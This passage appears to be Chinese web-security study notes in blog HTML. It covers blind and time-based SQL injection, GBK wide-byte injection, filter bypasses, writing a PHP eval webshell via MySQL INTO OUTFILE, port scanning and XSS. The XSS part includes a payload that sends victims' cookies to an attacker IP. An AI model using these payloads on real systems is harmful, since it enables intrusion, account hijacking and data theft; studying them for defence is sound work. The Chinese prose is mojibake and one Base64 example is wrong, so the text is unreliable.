SLEEP(5)</code>ï¼Œå¹¶é€šè¿‡åˆ†æåº”ç”¨ç¨‹åºçš„å“åº”æ—¶é—´æ¥æ¨å¯¼å‡ºæŸ¥è¯¢ç»“æœï¼Œä»è€Œäº†è§£æ•°æ®åº“çš„ä¿¡æ¯ã€‚</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<br></code></pre></td></tr></table></figure><p>å¦‚æœè¯¥æŸ¥è¯¢è¿”å›ç»“æœï¼Œåˆ™è®¤è¯ç³»ç»Ÿå°†ç”¨æˆ·â€œadminâ€çš„å¯†ç è®¾ç½®ä¸ºä»¥â€œaâ€å¼€å¤´çš„å­—ç¬¦ä¸²ã€‚æ”»å‡»è€…åˆ©ç”¨è¿™ä¸€ç‚¹å¯ä»¥é€šè¿‡é€ä¸€æšä¸¾åˆ¤æ–­å¯†ç çš„æ¯ä¸ªå­—ç¬¦æ¥çŒœæµ‹å¯†ç ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥è¿›è¡Œä»¥ä¸‹å°è¯•ï¼š</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;b%&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;c%&#x27;</span>;<br>...<br></code></pre></td></tr></table></figure><p>å¦‚æœæŸ¥è¯¢è¿”å›ç»“æœï¼Œåˆ™æ„å‘³ç€è¯¥å­—ç¬¦ä¸²ä»¥è¯¥å­—ç¬¦å¼€å¤´</p><h3 id="è®¡æ—¶æ”»å‡»ï¼ˆTime-based-Attackï¼‰å®ç°ç›²æ³¨"><a href="#è®¡æ—¶æ”»å‡»ï¼ˆTime-based-Attackï¼‰å®ç°ç›²æ³¨" class="headerlink" title="è®¡æ—¶æ”»å‡»ï¼ˆTime-based Attackï¼‰å®ç°ç›²æ³¨"></a>è®¡æ—¶æ”»å‡»ï¼ˆTime-based Attackï¼‰å®ç°ç›²æ³¨</h3><p>å‡è®¾ç›®æ ‡ç½‘ç«™æœ‰ä¸€ä¸ªç™»å½•è¡¨å•ï¼Œç”¨æˆ·åå’Œå¯†ç å°†è¢«å‘é€åˆ°æœåŠ¡å™¨è¿›è¡ŒéªŒè¯ã€‚æ”»å‡»è€…æƒ³è¦ä½¿ç”¨æ³¨å…¥æ”»å‡»å°è¯•è·å–ç®¡ç†å‘˜è´¦æˆ·çš„å¯†ç ï¼Œæ”»å‡»è€…å¯ä»¥åƒä¸‹é¢è¿™æ ·æ„é€ ä¸€ä¸ª SQL æŸ¥è¯¢ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;a%&#x27;</span> <span class="hljs-keyword">AND</span> sleep(<span class="hljs-number">10</span>)<span class="hljs-comment">--&#x27;</span><br></code></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„æŸ¥è¯¢ä¸­ï¼Œ <code>--&#39;</code> æ˜¯æ³¨é‡Šï¼Œå®ƒä¼šæ³¨é”€æ‰æŸ¥è¯¢ä¸­çš„å‰©ä½™éƒ¨åˆ†ï¼Œä»¥é¿å…ä»»ä½•å…¶ä»–æŸ¥è¯¢å‚æ•°å¼•èµ·çš„é”™è¯¯ã€‚æŸ¥è¯¢çš„ SLEEP() å‡½æ•°å°†å»¶è¿Ÿå“åº”æ—¶é—´ï¼Œå¦‚æœç»“æœå¾—åˆ°äº†è¿”å›ï¼Œé‚£ä¹ˆåœ¨æŸ¥è¯¢è¿”å›ä¹‹å‰å°†ä¼šç­‰å¾…10ç§’é’Ÿï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥æ¨æ–­è¿™ä¸ªæŸ¥è¯¢æ˜¯æ­£ç¡®çš„ï¼Œè¿™æ„å‘³ç€åœ¨å¯†ç å­—æ®µä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ â€˜aâ€™ã€‚é€šè¿‡é‡å¤è¿™ä¸ªè¿‡ç¨‹ï¼Œæ”»å‡»è€…å¯ä»¥å°è¯•é€æ¸çŒœæµ‹å¯†ç ä¸­çš„æ¯ä¸€ä¸ªå­—ç¬¦ï¼Œæœ€ç»ˆè·å¾—ç®¡ç†å‘˜è´¦æˆ·çš„å¯†ç ã€‚</p><p><code>benchmark</code> å‘½ä»¤æ¥æµ‹è¯•æ•°æ®åº“çš„å“åº”æ—¶é—´ï¼Œä»¥ç¡®å®šæ³¨å…¥è¯­å¥çš„æœ‰æ•ˆæ€§å’Œå¯è¡Œæ€§ã€‚ä¾‹å¦‚ï¼Œåœ¨ SQL æ³¨å…¥æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ„é€ ä¸€ä¸ªåŒ…å« <code>benchmark</code> å‘½ä»¤çš„æ³¨å…¥è¯­å¥ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">SELECT benchmark(<span class="hljs-number">1000000</span>, MD5(&#x27;a&#x27;))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>ä¸Šè¿°è¯­å¥å°†æ‰§è¡Œ 100 ä¸‡æ¬¡ MD5 åŠ å¯†æ“ä½œ</p><p>â¼†åˆ†æ³•é€å­—çŒœè§£ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">çŒœè§£æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºï¼šd<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr(database(),1,1))=100 #</span><br><span class="hljs-string">çŒœè§£æ•°æ®åº“ç¬¬äºŒä¸ªå­—ç¬¦ä¸ºï¼šv</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">118</span> #<br>çŒœè§£æ•°æ®åº“ç¬¬ä¸‰ä¸ªå­—ç¬¦ä¸ºï¼šw<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and ascii(substr(database(),3,1))=119 #</span><br><span class="hljs-string">çŒœè§£æ•°æ®åº“ç¬¬ä¸‰ä¸ªå­—ç¬¦ä¸ºï¼ša</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">4</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">97</span> #<br><br>æ³¨é‡Šï¼š<br>substrï¼ˆstr,<span class="hljs-keyword">start</span>,stopï¼‰<br>substræˆªå–å­—ç¬¦ä¸²str,ä»<span class="hljs-keyword">start</span>å¼€å§‹æˆªå–ï¼Œæˆªå–stopä¸ªå­—ç¬¦<br></code></pre></td></tr></table></figure><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><p>æœ‰æ—¶å€™<code>&#39;</code>ä¼šè¢«æ›¿æ¢ä¸º<code>\&#39;</code>ä»¥é˜²æ­¢æˆ‘ä»¬æ„é€ <code>&#39;</code>é—­åˆï¼Œä»è€Œé˜²æ­¢æ³¨å…¥</p><p>å®½å­—èŠ‚æ³¨å…¥çš„æ„æ€æ˜¯ï¼Œåˆ©ç”¨GBKç¼–ç æ˜¯å®½å­—èŠ‚ï¼ˆä¸¤ä¸ªå­—èŠ‚æ„æˆä¸€ä¸ªæ±‰å­—ï¼‰çš„ç‰¹ç‚¹ï¼Œç»•è¿‡<code>\&#39;</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; and 1=1--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">%df&#x27;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">%</span>df\<span class="hljs-string">&#x27;ï¼ˆå•å¼•å·ä¼šè¢«åŠ ä¸Šè½¬ä¹‰å­—ç¬¦\ï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">%df\&#x27;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">%</span>df<span class="hljs-operator">%</span><span class="hljs-number">5</span>c<span class="hljs-string">&#x27;ï¼ˆ\çš„åå…­è¿›åˆ¶ä¸º%5cï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">%df%5c&#x27;</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>ç¸—<span class="hljs-string">&#x27;ï¼ˆGBKç¼–ç æ—¶ä¼šè®¤ä¸ºè¿™æ—¶ä¸€ä¸ªå®½å­—èŠ‚ï¼‰</span><br></code></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_18980147/article/details/127502369">https://blog.csdn.net/qq_18980147/article/details/127502369</a></p><h2 id="æ³¨å…¥çš„ç»•è¿‡æŠ€å·§"><a href="#æ³¨å…¥çš„ç»•è¿‡æŠ€å·§" class="headerlink" title="æ³¨å…¥çš„ç»•è¿‡æŠ€å·§"></a>æ³¨å…¥çš„ç»•è¿‡æŠ€å·§</h2><p>ç»•è¿‡ç©ºæ ¼</p><ul><li>æ³¨é‡Šæ›¿æ¢ç©ºæ ¼/**/</li><li>ä¸¤ä¸ªç©ºæ ¼ä»£æ›¿ä¸€ä¸ªç©ºæ ¼ï¼Œç”¨Tabä»£æ›¿ç©ºæ ¼ï¼Œ%a0=ç©ºæ ¼</li><li>æ‹¬å·ç»•è¿‡ç©ºæ ¼ï¼šåœ¨MySQLä¸­ï¼Œæ‹¬å·æ˜¯ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢çš„ã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚ä¾‹å¦‚ï¼š<code>select(user())from dual where(1=1)and(2=2)</code>ã€<code>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</code></li></ul><p>å¼•å·ç»•è¿‡</p><ul><li>å°†å­—ç¬¦æ›¿æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²</li></ul><p>åŒå†™ç»•è¿‡</p><ul><li>è‹¥åªè¿‡æ»¤1æ¬¡ï¼Œåˆ™å¯ä»¥åŒå†™ç»•è¿‡ï¼ˆå†™ä¸¤æ¬¡åˆ™ç•™ä¸‹ä¸€æ¬¡ï¼‰</li></ul><p>ç­‰å·æ›¿æ¢ä¸ºlike</p><p>order byæ›¿æ¢ä¸ºinto</p><p>andã€orã€xor</p><ul><li>and ç­‰äº&amp;&amp;ã€or ç­‰äº ||ã€not ç­‰äº !ã€xor ç­‰äº|</li></ul><p>é€—å·ç»•è¿‡</p><ul><li>substr(database(),1,1)â€”&gt; substr(database() from 1 for 1)</li></ul><p>urlç¼–ç è¿›è¡Œç»•è¿‡</p><ul><li>é™¤äº†å¸¸è§çš„ç©ºæ ¼å­—ç¬¦ï¼ˆ%20ï¼‰å¤–ï¼Œå…¶ä»–å­—ç¬¦ä¹Ÿå¯ä»¥ç”¨äºæ··æ·†ï¼Œå¦‚éæ–­è¡Œç©ºæ ¼ï¼ˆ%a0ï¼‰ã€åˆ¶è¡¨ç¬¦ï¼ˆ%09ï¼‰ã€æ¢è¡Œç¬¦ï¼ˆ%0aï¼‰ã€å›è½¦ç¬¦ï¼ˆ%0dï¼‰ã€å‚ç›´åˆ¶è¡¨ç¬¦ï¼ˆ%0bï¼‰å’ŒåŠ å·ï¼ˆ+ï¼‰</li></ul><h2 id="sqlmap-â€“os-shellåŸç†"><a href="#sqlmap-â€“os-shellåŸç†" class="headerlink" title="sqlmap â€“os-shellåŸç†"></a>sqlmap â€“os-shellåŸç†</h2><p>æœ¬è´¨ä¸Šä¸Šä¼ äº†ä¸¤ä¸ªPHPæ–‡ä»¶ï¼Œå…¶ä¸­ä¸€ä¸ªç»™æˆ‘ä»¬æä¾›äº†æ–‡ä»¶ä¸Šä¼ çš„é¡µé¢ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªä¸Šä¼ é¡µé¢ä¸Šä¼ è„šæœ¬æ–‡ä»¶åˆ°å½“å‰ç›®å½•ä¸‹ã€‚ å¦å¤–ä¸€ä¸ªåˆ™æ˜¯è¿”å›äº†å¯ä»¥è®©æˆ‘ä»¬æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‘½ä»¤è¡Œï¼Œå‘½ä»¤è¡Œä¹Ÿå¯ä»¥åœ¨ç½‘é¡µurlä¸­é€šè¿‡å¯¹cmdå‚æ•°ä¼ å‚æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><h2 id="MySQLå†™webshellçš„æ¡ä»¶"><a href="#MySQLå†™webshellçš„æ¡ä»¶" class="headerlink" title="MySQLå†™webshellçš„æ¡ä»¶"></a>MySQLå†™webshellçš„æ¡ä»¶</h2><blockquote><p>webshellæ˜¯ä¸€ç§å¯ä»¥æ§åˆ¶å’Œæ“ä½œç½‘ç«™çš„æ¶æ„ä»£ç ï¼Œé€šå¸¸æ˜¯ä¸€å¥è¯æœ¨é©¬æˆ–è€…å…¶ä»–è„šæœ¬è¯­è¨€ç¼–å†™çš„æ–‡ä»¶ã€‚å¦‚æœç½‘ç«™å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨MySQLæ•°æ®åº“çš„ä¸€äº›ç‰¹æ€§å’Œå‡½æ•°ï¼Œå°†webshellå†™å…¥åˆ°ç½‘ç«™çš„å¯è®¿é—®ç›®å½•ä¸­ï¼Œç„¶åé€šè¿‡å®¢æˆ·ç«¯å·¥å…·ï¼ˆå¦‚ä¸­å›½èœåˆ€ï¼‰æ¥è¿æ¥å’Œæ‰§è¡Œwebshel</p></blockquote><p>MySQLæ•°æ®åº“å†™å…¥webshellçš„æ–¹æ³•:</p><ul><li>ä½¿ç”¨outfileæ–¹æ³•ï¼šè¿™æ˜¯ä¸€ç§MySQLæä¾›çš„ç”¨æ¥å†™å…¥æ–‡ä»¶çš„å‡½æ•°ï¼Œå¯ä»¥å°†æŸ¥è¯¢ç»“æœæˆ–è€…æŒ‡å®šçš„å­—ç¬¦ä¸²å†™å…¥åˆ°æŒ‡å®šçš„è·¯å¾„ä¸­<code>union select 1,2,3,4,&#39;&lt;?php @eval($_POST[pass]);?&gt;&#39; into outfile &#39;C:/wamp64/www/work/webshell.php&#39;</code></li></ul><h2 id="å±å®³"><a href="#å±å®³" class="headerlink" title="å±å®³"></a>å±å®³</h2><ul><li>æ•°æ®æ³„éœ²</li><li>ç½‘é¡µç¯¡æ”¹</li><li>è·å–æœåŠ¡å™¨æƒé™ï¼ˆå†™webshellï¼‰</li></ul><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://cloud.tencent.com/developer/article/1632161">MySQLæ‰‹æ³¨ä¹‹å¸ƒå°”å‹ç›²æ³¨è¯¦è§£ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a></li></ul><h1 id="ç«¯å£æ”¶é›†"><a href="#ç«¯å£æ”¶é›†" class="headerlink" title="ç«¯å£æ”¶é›†"></a>ç«¯å£æ”¶é›†</h1><p>å¸¸ç”¨çš„ç«¯å£æ‰«æå’Œæ”¶é›†å·¥å…·ï¼š</p><ol><li>Nmapï¼šæ˜¯ä¸€ä¸ªå¼ºå¤§çš„ç½‘ç»œç«¯å£æ‰«æå·¥å…·ï¼Œå¯ä»¥é€šè¿‡å„ç§æ‰«ææŠ€æœ¯æ¥æ£€æµ‹ç½‘ç»œä¸Šæ‰€æœ‰æ´»è·ƒçš„ä¸»æœºå’Œå¼€æ”¾çš„ç«¯å£ï¼Œæ”¯æŒå¤šç§æ“ä½œç³»ç»Ÿã€‚</li><li>Masscanï¼šæ˜¯ä¸€ç§å¿«é€Ÿçš„ç«¯å£æ‰«æå·¥å…·ï¼Œå¯ä»¥åœ¨å‡ åˆ†é’Ÿå†…åœ¨å¤§è§„æ¨¡ç½‘ç»œä¸­å‘ç°å¹¶è·å–æ‰€æœ‰å¼€æ”¾çš„TCP/UDPç«¯å£ã€‚</li><li>Zmapï¼šæ˜¯ä¸€ä¸ªç”¨äºå¿«é€Ÿæ‰«æIPv4ç½‘ç»œçš„å¼€æºå·¥å…·ï¼Œå¯ä»¥é«˜æ•ˆåœ°å‘ç°å¹¶æ”¶é›†ç›®æ ‡ç½‘ç»œä¸Šå¼€æ”¾çš„ç«¯å£ã€åœ°å€å’ŒæœåŠ¡ç­‰ä¿¡æ¯ã€‚</li><li>Unicornscanï¼šæ˜¯ä¸€ç§å¿«é€Ÿã€é«˜åº¦å¯å®šåˆ¶çš„ç«¯å£æ‰«æå’Œä¿¡æ¯æœé›†å·¥å…·ï¼Œå¯åœ¨è¾ƒçŸ­çš„æ—¶é—´å†…æ£€æµ‹å‡ºç›®æ ‡ç½‘ç»œå¼€æ”¾çš„ç«¯å£å’ŒæœåŠ¡ã€‚</li><li>Netcatï¼šæ˜¯ä¸€ä¸ªç±»Unixå¹³å°ä¸Šçš„ç½‘ç»œé€šä¿¡å·¥å…·ï¼Œåœ¨æ¸—é€æµ‹è¯•ä¸­å¯ä»¥ç”¨äºæ¢æµ‹ç›®æ ‡IPå’Œç«¯å£çš„å¼€æ”¾æƒ…å†µï¼Œè¿˜å¯ä»¥è¿›è¡Œç«¯å£æ‰«æå’Œæ¼æ´æµ‹è¯•ç­‰ã€‚</li></ol><p>å¸¸è§é«˜å±ç«¯å£åŒ…æ‹¬ï¼š</p><ol><li>21ç«¯å£ï¼šFTPï¼ˆFile Transfer Protocolï¼‰æœåŠ¡ç«¯å£ï¼Œå­˜åœ¨å¼ºåˆ¶å…¥ä¾µã€æ–‡ä»¶æ³¨å…¥ã€æ–‡ä»¶æ³„éœ²çš„é£é™©ã€‚</li><li>22ç«¯å£ï¼šSSHï¼ˆSecure Shellï¼‰æœåŠ¡ç«¯å£ï¼Œå­˜åœ¨å¼ºåˆ¶å…¥ä¾µã€ææƒã€æœ¨é©¬ã€è¿œç¨‹æ‰§è¡Œä»£ç çš„é£é™©ã€‚</li><li>23ç«¯å£ï¼šTelnetæœåŠ¡ç«¯å£ï¼Œå­˜åœ¨å¼ºåˆ¶å…¥ä¾µã€è¿œç¨‹æ‰§è¡Œä»£ç ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²çš„é£é™©ã€‚</li><li>80ç«¯å£ï¼šHTTPï¼ˆHyper Text Transfer Protocolï¼‰æœåŠ¡ç«¯å£ï¼Œå­˜åœ¨ä¿¡æ¯æ³„éœ²ã€è·¨ç«™è„šæœ¬æ”»å‡»ã€SQLæ³¨å…¥ç­‰é£é™©ã€‚</li><li>139/445ç«¯å£ï¼šSMBï¼ˆServer Message Blockï¼‰æœåŠ¡ç«¯å£ï¼Œå­˜åœ¨å¼ºåˆ¶å…¥ä¾µã€ææƒã€è¿œç¨‹æ‰§è¡Œä»£ç ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²çš„é£é™©ã€‚</li><li>1433ç«¯å£ï¼šSQL Serveræ•°æ®åº“æœåŠ¡ç«¯å£ï¼Œå­˜åœ¨SQLæ³¨å…¥ã€ææƒã€è¿œç¨‹æ‰§è¡Œä»£ç ã€æ•°æ®æ³„éœ²ç­‰é£é™©ã€‚</li><li>3306ç«¯å£ï¼šMySQLæ•°æ®åº“æœåŠ¡ç«¯å£ï¼Œå­˜åœ¨SQLæ³¨å…¥ã€ææƒã€è¿œç¨‹æ‰§è¡Œä»£ç ç­‰é£é™©ã€‚</li></ol><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.example.com/myscripts.js&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥åœ¨myscripts.jsä¸­æ’å…¥æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&#x27;æ¶æ„ä»£ç å·²æ‰§è¡Œï¼&#x27;</span>);</span><br></code></pre></td></tr></table></figure><p>å½“ç”¨æˆ·è®¿é—®åŒ…å«ä¸Šè¿°ä»£ç çš„ç½‘é¡µæ—¶ï¼Œæ¶æ„ä»£ç å°†è¢«æ‰§è¡Œï¼Œå¼¹å‡ºä¸€ä¸ªè­¦å‘Šæ¡†</p><p>å¦‚æœæ”»å‡»è€…å¸Œæœ›é€šè¿‡ JavaScript ä»£ç å°† cookie å‘é€ç»™è‡ªå·±ï¼Œå¯ä»¥å¦‚ä¸‹æ„é€ jsä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script&gt;document.write(<span class="hljs-string">&#x27;&lt;img src=http://10.9.0.1:5555?c=&#x27;</span> + escape(document.cookie) + <span class="hljs-string">&#x27;&gt;&#x27;</span>); &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>å½“ JavaScript æ’å…¥ img æ ‡è®°æ—¶ï¼Œæµè§ˆå™¨å°è¯•ä» src å­—æ®µä¸­çš„ URL åŠ è½½å›¾åƒ; è¿™å¯¼è‡´å‘æ”»å‡»è€…çš„æœºå™¨å‘é€ HTTP GET è¯·æ±‚</p><h2 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h2><p>XSSæ”»å‡»å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ç§ç±»å‹ï¼š</p><ol><li>å­˜å‚¨å‹XSSæ”»å‡»ï¼Œåˆç§°æŒä¹…å‹XSSï¼šæ”»å‡»è€…å°†æ¶æ„è„šæœ¬ä»£ç å­˜å‚¨åœ¨Webåº”ç”¨ç¨‹åºçš„æ•°æ®åº“ä¸­ï¼Œå½“ç”¨æˆ·è®¿é—®åŒ…å«è¯¥æ¶æ„ä»£ç çš„é¡µé¢æ—¶ï¼Œæ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œã€‚</li><li>åå°„å‹XSSæ”»å‡»ï¼Œåˆç§°éæŒä¹…å‹XSSï¼šæ”»å‡»è€…å°†æ¶æ„è„šæœ¬ä»£ç ä½œä¸ºå‚æ•°å‘é€ç»™Webåº”ç”¨ç¨‹åºï¼ŒWebåº”ç”¨ç¨‹åºå°†è¯¥å‚æ•°åå°„å›ç»™ç”¨æˆ·ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚</li><li>DOMå‹XSSæ”»å‡»ï¼šæ”»å‡»è€…é€šè¿‡ä¿®æ”¹ç½‘é¡µçš„DOMç»“æ„ï¼Œå°†æ¶æ„è„šæœ¬ä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸­ï¼Œä»è€Œå®ç°æ”»å‡»ã€‚</li></ol><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><ol><li>HTMLç¼–ç ç»•è¿‡ï¼šæ”»å‡»è€…é€šè¿‡å¯¹æ¶æ„è„šæœ¬ä»£ç è¿›è¡ŒHTMLç¼–ç ï¼Œä»è€Œç»•è¿‡åº”ç”¨ç¨‹åºçš„è¿‡æ»¤å’ŒéªŒè¯ã€‚</li><li>JavaScriptç¼–ç ç»•è¿‡ï¼šæ”»å‡»è€…é€šè¿‡å¯¹æ¶æ„è„šæœ¬ä»£ç è¿›è¡ŒJavaScriptç¼–ç ï¼Œä»è€Œç»•è¿‡åº”ç”¨ç¨‹åºçš„è¿‡æ»¤å’ŒéªŒè¯ã€‚</li><li>DOMå‹XSSæ”»å‡»ï¼šæ”»å‡»è€…é€šè¿‡ä¿®æ”¹ç½‘é¡µçš„DOMç»“æ„ï¼Œå°†æ¶æ„è„šæœ¬ä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸­ï¼Œä»è€Œå®ç°æ”»å‡»ã€‚</li></ol><h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><ol><li>Unicodeç¼–ç ï¼šæ”»å‡»è€…é€šè¿‡å¯¹æ¶æ„è„šæœ¬ä»£ç è¿›è¡ŒUnicodeç¼–ç ï¼Œä»è€Œç»•è¿‡åº”ç”¨ç¨‹åºçš„è¿‡æ»¤å’ŒéªŒè¯ã€‚ä¾‹å¦‚ï¼Œå°†<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>ç¼–ç ä¸º<code>\u003Cscript\u003Ealert(&#39;XSS&#39;)\u003C/script\u003E</code>ã€‚</li><li>Base64ç¼–ç ï¼šæ”»å‡»è€…é€šè¿‡å¯¹æ¶æ„è„šæœ¬ä»£ç è¿›è¡ŒBase64ç¼–ç ï¼Œä»è€Œç»•è¿‡åº”ç”¨ç¨‹åºçš„è¿‡æ»¤å’ŒéªŒè¯ã€‚ä¾‹å¦‚ï¼Œå°†<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>ç¼–ç ä¸º<code>PHNjcmlwdD5hbGVydCgnWFMnKTwvc2NyaXB0Pg==</code>ã€‚</li><li>åå…­è¿›åˆ¶ç¼–ç ï¼šæ”»å‡»è€…é€šè¿‡å¯¹æ¶æ„è„šæœ¬ä»£ç è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç ï¼Œä»è€Œç»•è¿‡åº”ç”¨ç¨‹åºçš„è¿‡æ»¤å’ŒéªŒè¯ã€‚ä¾‹å¦‚ï¼Œå°†<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>ç¼–ç ä¸º<code>%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E</code>ã€‚</li><li>åŒé‡ç¼–ç ï¼šæ”»å‡»è€…é€šè¿‡å¯¹æ¶æ„è„šæœ¬ä»£ç è¿›è¡ŒåŒé‡HTMLç¼–ç ï¼Œä»è€Œç»•è¿‡åº”ç”¨ç¨‹åºçš„è¿‡æ»¤å’ŒéªŒè¯ã€‚ä¾‹å¦‚ï¼Œå°†<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>ç¼–ç 